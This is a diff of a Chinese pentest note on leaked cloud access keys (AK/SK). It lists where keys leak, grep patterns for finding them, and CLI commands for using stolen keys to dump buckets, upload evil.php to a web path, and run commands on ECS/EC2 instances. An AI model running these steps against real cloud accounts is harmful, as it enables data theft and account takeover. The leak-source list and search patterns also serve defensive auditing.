@@ -2,33 +2,66 @@
 
 ## 泄露途径
 ```
-文件上传返回包
-图片查看返回包、图片上传返回包
-配置文件、js 前端代码
-后台配置页面
-Git 泄露、备份文件
+Git 泄露：.git 目录暴露导致代码泄露
+前端 JS：Webpack 打包未清理，AK/SK 硬编码在 JS 中
+配置文件：.env、config.js、config.json、appsettings.json
+备份文件：.bak、.swp、.old 文件、www.zip、backup.sql
+文件上传返回包：上传后返回的 url 中包含 AK/SK
+图片查看返回包：获取图片时 response 中携带 AK/SK
+后台配置页面：云存储配置页面直接显示 AK/SK
+移动端 APK：反编译 APK 后查找硬编码密钥
+错误信息：异常栈信息中泄露临时凭据
 ```
 
-## 泄露风险
-AK/SK 泄露等于直接接管云资源
+## 检测方法
 ```bash
-# 使用 aliyun-cli
+# 正则搜索代码中的 AK/SK
+grep -r "accesskey"  -i .
+grep -r "secretkey"  -i .
+grep -r "aliyun.*key\|oss.*key" -i --include="*.js" .
+grep -r "AKID\|SecretId\|SecretKey" -i .
+grep -r "aws_access_key\|aws_secret" -i .
+
+# 搜索常见云厂商密钥格式
+阿里云 AK: 以 LTAI 开头
+AWS AK:   ＡＫＩＡ 开头
+腾讯云:   AKID 开头
+```
+
+## 利用
+```bash
+# 阿里云 OSS
+aliyun configure set --access-key-id LTAI*** --access-key-secret ***
 aliyun oss ls
-aliyun oss cp oss://bucket/path ./local
+aliyun oss cp oss://bucket/path ./local -r
+aliyun oss cp ./evil.php oss://bucket/web/  # 写文件
 
-# 使用 aws-cli
-aws s3 ls s3://bucket
-aws s3 sync s3://bucket ./local
+# AWS S3
+aws configure
+aws s3 ls s3://bucket-name --recursive
+aws s3 sync s3://bucket-name ./local
+aws s3 cp ./evil.txt s3://bucket-name/  # 上传
+
+# 查看桶策略
+aws s3api get-bucket-policy --bucket bucket-name
+aws s3api get-bucket-acl --bucket bucket-name
 ```
 
-## 检测工具
+## 利用云 API 横向移动
 ```bash
-# 云资源遍历工具
-阿里云: aliyunoss 工具
-AWS:   s3scanner, cloud_enum
-通用:  针对公开存储桶的列举工具
+# 阿里云 ECS（接管服务器）
+aliyun ecs DescribeInstances --region cn-hangzhou
+aliyun ecs CreateInstance --...  # 创建新实例
+aliyun ecs RunCommand --InstanceId xxx --Command "whoami"
+
+# AWS EC2
+aws ec2 describe-instances --region us-east-1
+aws ec2 run-instances --image-id ami-xxx ...
 ```
 
-## 一旦泄露直接高危
-可读取/写入/删除所有云存储文件
-可进一步横向移动到其他云服务
+## 风险等级
+AK/SK 泄露 = 直接高危，可导致：
+1. 读取/写入/删除所有云存储文件
+2. 创建新的云资源（如 ECS/C2）
+3. 横向移动到其他云服务（RDS、ECS、CF）
+4. 控制整个云账号
